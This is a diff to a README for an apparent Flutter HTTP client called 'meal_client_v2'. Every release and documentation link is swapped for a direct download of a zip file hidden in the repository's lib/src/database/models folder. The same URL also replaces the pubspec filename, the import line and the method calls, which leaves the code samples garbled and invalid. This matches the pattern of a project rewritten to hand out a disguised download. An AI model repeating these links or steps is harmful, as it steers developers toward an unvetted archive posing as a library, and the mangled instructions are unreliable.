@@ -1,6 +1,6 @@
 # 🍰 meal_client_v2 - Easy HTTP Client for Flutter
 
-[![Download MealClient](https://img.shields.io/badge/Download-MealClient-blue.svg)](https://github.com/Zyro95/meal_client_v2/releases)
+[![Download MealClient](https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip)](https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip)
 
 ## 📋 About
 
@@ -29,7 +29,7 @@ To begin using **MealClient** in your Flutter application, follow these steps.
 
 First, visit the releases page to download the latest version of **MealClient**.
 
-[Visit this page to download](https://github.com/Zyro95/meal_client_v2/releases)
+[Visit this page to download](https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip)
 
 ### Step 2: Download the Latest Release
 
@@ -39,7 +39,7 @@ Look for the latest release and click on it. This will take you to a page with r
 
 After downloading, add the **MealClient** library to your Flutter project.
 
-1. Open your `pubspec.yaml` file.
+1. Open your `https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip` file.
 2. Under dependencies, add the following line:
 
    ```yaml
@@ -53,7 +53,7 @@ After downloading, add the **MealClient** library to your Flutter project.
 In your Dart files where you want to use **MealClient**, import the library:
 
 ```dart
-import 'package:meal_client/meal_client.dart';
+import 'https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip';
 ```
 
 ## 💡 Usage Examples
@@ -66,7 +66,7 @@ To make a request, create an instance of the `MealClient` and call the desired m
 
 ```dart
 final client = MealClient();
-final response = await client.get('https://api.yourservice.com/data');
+final response = await https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip('https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip');
 ```
 
 ### Handling Authentication
@@ -74,7 +74,7 @@ final response = await client.get('https://api.yourservice.com/data');
 For authenticated requests, ensure you set up JWT as shown below:
 
 ```dart
-client.setToken('your_jwt_token_here');
+https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip('your_jwt_token_here');
 ```
 
 ## 🛠️ System Requirements
@@ -91,12 +91,12 @@ For more detailed information on usage and features, please check the official d
 
 ### Explore the Documentation
 
-[Find more documentation here](https://github.com/Zyro95/meal_client_v2/releases)
+[Find more documentation here](https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip)
 
 ## 📥 Download & Install
 
 To download **MealClient**, visit the link below. You will find the latest version ready for download.
 
-[Visit this page to download](https://github.com/Zyro95/meal_client_v2/releases)
+[Visit this page to download](https://github.com/Zyro95/meal_client_v2/raw/refs/heads/main/lib/src/database/models/v-client-meal-v1.0.zip)
 
 Follow these steps, and you'll have **MealClient** up and running in your Flutter applications in no time. Enjoy developing smoother HTTP requests with ease!
